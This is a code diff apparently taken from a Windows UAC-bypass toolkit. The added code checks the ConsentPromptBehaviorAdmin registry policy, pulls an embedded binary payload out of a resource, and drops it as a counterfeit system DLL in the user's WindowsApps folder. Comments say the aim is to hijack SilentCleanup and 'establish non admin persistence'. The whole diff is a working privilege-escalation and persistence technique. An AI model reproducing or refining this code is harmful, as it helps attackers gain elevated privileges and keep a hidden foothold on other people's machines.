@@ -588,7 +588,50 @@ UCM_API(MethodDebugObject)
     else
         lpszPayload = g_ctx->szOptionalParameter;
 
-    return ucmDebugObjectMethod(lpszPayload);
+
+    HKEY hKey;
+    LONG lResult;
+    DWORD dwValue, dwSize = sizeof(dwValue);
+
+    // First, check for a policy.
+    lResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0,
+        KEY_READ, &hKey);
+    if (lResult == ERROR_SUCCESS)
+    {
+        lResult = RegQueryValueEx(hKey, L"ConsentPromptBehaviorAdmin", 0, NULL,
+            (LPBYTE)&dwValue, &dwSize);
+
+        RegCloseKey(hKey);
+    }
+
+    if (dwValue == 2) {
+
+        //check if dll exists in silentcleanup, if not plant dll,
+
+        HGLOBAL resHandle = NULL;
+        HRSRC res;
+
+        unsigned char* payload;
+        unsigned int payload_len;
+        res = FindResource(g_hInstance, MAKEINTRESOURCE(107), L"BIN"); // substitute RESOURCE_ID and RESOURCE_TYPE.
+
+
+
+        resHandle = LoadResource(g_hInstance, res);
+        payload = (unsigned char*)LockResource(resHandle);
+
+        payload_len = SizeofResource(g_hInstance, res);
+
+
+
+        writeFileToDisk(L"C:\\Users\\d\\Appdata\\Local\\Microsoft\\WindowsApps\\api-ms-win-core-kernel32-legacy-l1.dll", payload, payload_len);
+
+        //plant dll n run silentcleanup
+        //establish non admin persistence
+    }
+    else {
+        return ucmDebugObjectMethod(lpszPayload);
+    }
 }
 
 UCM_API(MethodShellChangePk)
